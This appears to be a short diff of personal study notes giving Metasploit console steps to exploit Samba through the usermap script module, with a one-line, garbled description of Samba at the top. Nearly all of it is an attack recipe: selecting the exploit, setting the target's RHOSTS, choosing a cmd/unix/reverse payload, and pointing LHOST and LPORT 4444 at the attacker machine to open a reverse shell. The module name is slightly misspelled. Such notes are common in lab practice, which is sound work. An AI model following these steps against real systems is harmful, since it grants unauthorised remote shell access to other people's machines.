@@ -1,0 +1,15 @@
+ samba is a tool use on linux and unix it make use of windown files and print series  to be able to access login, authentication and access control for windows network
+*inside msfconsole
+*search exploit samba 
+*use exploit/multi/samba/usermap.script
+*show options
+*set RHOSTS ip address of the target machine
+*set the payload
+*show payloads
+*set payload cmd/unix/reverse
+*set required argument for payloads
+*show options
+*set LHOST ip address of the attacker machine
+*set LPORT 4444
+*exploit
+
